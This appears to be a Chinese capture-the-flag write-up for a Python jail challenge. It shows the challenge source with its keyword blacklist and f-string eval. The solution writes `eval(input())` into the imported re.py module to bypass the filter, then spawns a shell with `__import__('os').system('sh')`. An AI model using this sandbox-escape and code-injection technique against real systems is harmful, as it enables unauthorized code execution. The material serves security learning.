# Pyjail

本题改编自2023强网杯Pyjail ! It’s myFILTER !!!

源码如下：

```python
import code, os, subprocess,re
import pty
def blacklist_fun_callback(*args):
    print("You are Hacker!!!")

pty.spawn = blacklist_fun_callback
os.system = blacklist_fun_callback
os.popen = blacklist_fun_callback
subprocess.Popen = blacklist_fun_callback
subprocess.call = blacklist_fun_callback
code.interact = blacklist_fun_callback
code.compile_command = blacklist_fun_callback

vars = blacklist_fun_callback
attr = blacklist_fun_callback
dir = blacklist_fun_callback
getattr = blacklist_fun_callback
exec = blacklist_fun_callback
__import__ = blacklist_fun_callback
compile = blacklist_fun_callback
breakpoint = blacklist_fun_callback
banner=
print(banner)
del os, subprocess, code, pty, blacklist_fun_callback
input_code = input("Can you input your code to escape > ")
print(input_code)

blacklist_words = [
    "subprocess",
    "os",
    "code",
    "interact",
    "pty",
    "pdb",
    "platform",
    "importlib",
    "timeit",
    "imp",
    "commands",
    "popen",
    "load_module",
    "spawn",
    "system",
    "/bin/sh",
    "/bin/bash",
    "flag",
    "eval",
    "exec",
    "compile",
    "input",
    "vars",
    "attr",
    "dir",
    "getattr"
    "__import__",
    "__builtins__",
    "__getattribute__",
    "__class__",
    "__base__",
    "__subclasses__",
    "__getitem__",
    "__self__",
    "__globals__",
    "__init__",
    "__name__",
    "__dict__",
    "._module",
    "builtins",
    "breakpoint",
    "import",
]

def check(input_code):
    for x in blacklist_words:
        if x in input_code:
            print("False")
            return False
    return True

while '{' in input_code and '}' in input_code and input_code.isascii() and check(input_code) and "eval" not in input_code and len(input_code) < 50 and "read" not in input_code :
    input_code = eval(f"f'{input_code}'")
    print(input_code)
else:
    print("Player! Please obey the rules!")

```

设置了黑名单，禁用了大部分的模块和模块自带的函数，同时还禁用了字符串"eval"和"read"（注意是字符串）,而且还规定了payload的长度不能超过50

在本题中，我import了一个无用的模块"re"，并给出了提示：可以往某些模块里写一些东西

我们知道，当这个python程序执行时，首先会执行import的模块，所以，我们可以往re里写入`{open("re.py","a").write("eva""l(inpu""t())")}`

用"分隔来规避字符串检测，写入之后再重新访问，程序在执行re.py时，就会触发`eval(input())`，可以让我们输入任意代码并用eval()函数执行

此时我们使用一句话RCE `__import__('os').system('sh')`，即可getshell

![image](https://img2024.cnblogs.com/blog/3267310/202404/3267310-20240424212710653-1815466753.png)